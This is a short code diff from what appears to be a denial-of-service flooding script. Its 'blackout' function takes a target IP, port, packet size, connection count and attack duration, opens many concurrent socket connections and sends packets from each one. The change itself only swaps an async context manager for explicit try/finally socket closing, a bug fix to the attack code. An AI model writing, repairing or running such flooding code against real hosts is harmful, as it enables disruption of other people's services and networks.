@@ -28,8 +28,11 @@ async def blackout(ip, port, size, connections, attack_duration):
         return sock
 
     async def attack():
-        async with connect() as sock:
+        sock = await connect()
+        try:
             await send_packet(sock)
+        finally:
+            sock.close()
 
     tasks = [attack() for _ in range(connections)]
     await asyncio.gather(*tasks)
